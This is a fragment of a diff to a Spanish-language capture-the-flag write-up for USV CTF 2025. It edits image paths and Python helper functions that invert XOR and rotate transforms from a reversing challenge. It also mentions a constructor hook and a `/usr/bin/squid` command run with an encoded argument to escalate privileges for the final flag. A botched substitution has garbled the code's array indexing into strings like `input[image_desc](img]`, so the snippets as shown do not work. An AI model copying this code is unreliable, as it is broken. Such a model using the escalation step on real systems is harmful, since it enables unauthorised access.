+      *(undefined *)(__param2 + j) = local_40[image_desc](img];
     }
 ```
 - `fun4` sí hace algo relevante, es un ROR.
@@ -704,14 +704,14 @@ def transform_2_1_inverse(b, n):
 def transform_2_inverse(input,len):
     for _ in range(44):
         for k in range(len):
-            input[image_desc](USV_CTF_2025/img] ^= 0x4f
-            input[image_desc](USV_CTF_2025/img] = transform_2_1_inverse(input[image_desc](USV_CTF_2025/img], k % 8)
+            input[image_desc](img] ^= 0x4f
+            input[image_desc](img] = transform_2_1_inverse(input[image_desc](img], k % 8)
     return input
 
 def transform_1_inverse(input,len):
     for i in range(len):
-        # Revertir input[image_desc](USV_CTF_2025/img] = (expected[image_desc](USV_CTF_2025/img] * ord('\r') ^ 0xaa)
-        input[image_desc](USV_CTF_2025/img] = (input[image_desc](USV_CTF_2025/img] ^ 0xaa) // ord('\r')
+        # Revertir input[image_desc](img] = (expected[image_desc](img] * ord('\r') ^ 0xaa)
+        input[image_desc](img] = (input[image_desc](img] ^ 0xaa) // ord('\r')
         print(input)
     return input
 
@@ -740,7 +740,7 @@ __attribute__((constructor)) void init() {
 
 Esperamos a que ocurra el remplazo y ejecutamos `/usr/bin/squid VBA8T1+oJidOYCGNVLowJ0ZQNA5fqiHlX9M9Ll94MORv0DA+X4gwRQ==` para escalar privilegios y obtener la séptima y última flag:
 
-![image_desc](USV_CTF_2025/img/2025-11-27-170328_1366x768_scrot.png)
+![image_desc](img/2025-11-27-170328_1366x768_scrot.png)
 ### Flags
 
 ```
